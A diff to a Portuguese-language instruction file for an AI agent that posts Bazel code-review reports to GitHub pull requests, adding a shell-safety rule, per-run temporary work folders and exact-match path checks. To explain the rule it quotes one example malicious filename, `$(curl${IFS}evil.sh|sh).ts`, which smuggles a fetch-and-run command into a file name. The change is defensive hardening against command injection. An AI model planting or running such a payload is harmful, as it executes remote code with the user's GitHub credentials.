@@ -5,7 +5,7 @@ description: Publishes to GitHub a review Bazel has already produced and you hav
   inline comments, reacts 👍 to what is already on the PR instead of repeating it, and posts
   an all-clear when there were no findings. Ships inside the Bazel binary; not the same as a
   `post-report` you may have installed, which resolves the file on its own.
-allowed-tools: Read Grep Glob Bash
+allowed-tools: Read Write Grep Glob Bash
 model: inherit
 effort: high
 ---
@@ -55,6 +55,20 @@ O caminho vem no prompt. O formato é o que o Bazel grava:
 A primeira linha dá **repo e número do PR**. O `- Head sha:` dá o commit que foi revisado. O
 que vem depois do `---` é o relatório, e é só ele que vira comentário — o cabeçalho é
 metadado do Bazel, não conteúdo do review.
+
+## Regra de shell
+
+**Nome de arquivo, título e corpo nunca entram numa linha de shell.** Nem entre aspas, nem em
+heredoc. O relatório cita o PR de outra pessoa, e um arquivo pode se chamar
+`$(curl${IFS}evil.sh|sh).ts`: colado num comando, ele roda na sua máquina com o `gh` de quem
+usa o Bazel. Por isso:
+
+- **Pasta de trabalho:** rode uma vez `mktemp -d "${TMPDIR:-/tmp}/bazel-post.XXXXXX"` e use o
+  caminho que ele imprimir em todos os passos. Nada de nome fixo em `/tmp`: dois publishes
+  rodam ao mesmo tempo. Apague a pasta no fim com `rm -rf`.
+- **Conteúdo:** tudo que vem do relatório ou do PR vai para arquivos nessa pasta **pela
+  ferramenta Write**, nunca por `echo`, `printf`, `cat <<` ou argumento de comando.
+- **Comandos:** só levam a pasta de trabalho, o número do PR e ids numéricos.
 
 ## Passo 1 — Três gates
 
@@ -120,12 +134,17 @@ Um relatório da frota traz os metadados prontos, uma linha por achado, logo aba
 Use esses valores verbatim quando existirem — `path`, `line`, `side` (`RIGHT` por padrão,
 `LEFT` para linha removida), e `start_line` quando o achado cobre uma faixa.
 
-Um agente que não segue esse formato deixa a âncora na prosa (`src/api/transfer.ts:88`).
-Aí vale ler o caminho e a linha dali — mas **confira que o arquivo e a linha existem no
-diff** antes de ancorar:
+Achado **sem** essa linha de metadados não tem âncora: vai para o corpo. Nunca leia caminho ou
+linha da prosa do relatório.
+
+Confira que os arquivos existem no diff com o comando abaixo, sem digitar nenhum caminho: ele
+tira os caminhos do relatório para um arquivo e compara por lista exata. `<review>` é o caminho
+que veio no prompt, e `<work>` é a pasta de trabalho. A saída são os caminhos que estão no diff;
+achado com caminho fora dela vai para o corpo.
 
 ```bash
-gh pr diff <N> --patch | grep -n "^+++ b/src/api/transfer.ts"
+grep '^<!-- finding ' '<review>' | grep -o ' path=[^ ]*' | sed 's/^ path=//' > '<work>/paths'
+gh pr diff <N> --name-only | grep -Fx -f '<work>/paths'
 ```
 
 Na dúvida, corpo. Um achado no corpo do review é lido; um achado ancorado na linha errada
@@ -176,10 +195,10 @@ e não se apaga sem rastro.
 
 ### Um review único com os inline (preferido)
 
-Agrupa tudo numa notificação só, em vez de N:
+Agrupa tudo numa notificação só, em vez de N. Grave com a ferramenta Write, em
+`<work>/review.json`, um JSON neste formato:
 
-```bash
-cat > /tmp/review.json <<'JSON'
+```json
 {
   "body": "## Automated review — Bazel\n\n<veredito e resumo>\n\nReviewed at `a1b2c3d`.",
   "event": "COMMENT",
@@ -192,9 +211,12 @@ cat > /tmp/review.json <<'JSON'
     }
   ]
 }
-JSON
+```
 
-gh api -X POST repos/{owner}/{repo}/pulls/<N>/reviews --input /tmp/review.json
+E envie:
+
+```bash
+gh api -X POST repos/{owner}/{repo}/pulls/<N>/reviews --input '<work>/review.json'
 ```
 
 - **`event: COMMENT`, sempre.** Nunca `REQUEST_CHANGES`: isso bloqueia o merge em nome do
@@ -215,7 +237,7 @@ Quando ancorar não vale a pena (achados espalhados, linhas fora do diff) ou nã
 sha não bate):
 
 ```bash
-gh pr comment <N> --body-file /tmp/report.md
+gh pr comment <N> --body-file '<work>/report.md'
 ```
 
 É o caminho mais seguro e o que se prefere na dúvida. Com sha diferente, o corpo **tem** que
@@ -231,7 +253,7 @@ Agente calado é indistinguível de agente que não rodou. Sem nenhum achado, po
 isso, com a cobertura junto quando o relatório trouxer uma seção `## Coverage`:
 
 ```bash
-gh pr comment <N> --body-file /tmp/all-clear.md
+gh pr comment <N> --body-file '<work>/all-clear.md'
 ```
 
 ```markdown
@@ -276,6 +298,7 @@ Se algum comentário foi recusado pela API, diga qual e por quê.
 ## Nunca
 
 - Nunca `APPROVE` nem `REQUEST_CHANGES` em nome do usuário.
+- Nunca pôr nome de arquivo, título ou corpo numa linha de shell.
 - Nunca repostar achado que já está no PR — nem reescrito, nem complementado.
 - Nunca postar em qualquer idioma que não inglês.
 - Nunca resolver nem fechar thread de review existente. A 👍 é a única escrita que se faz em
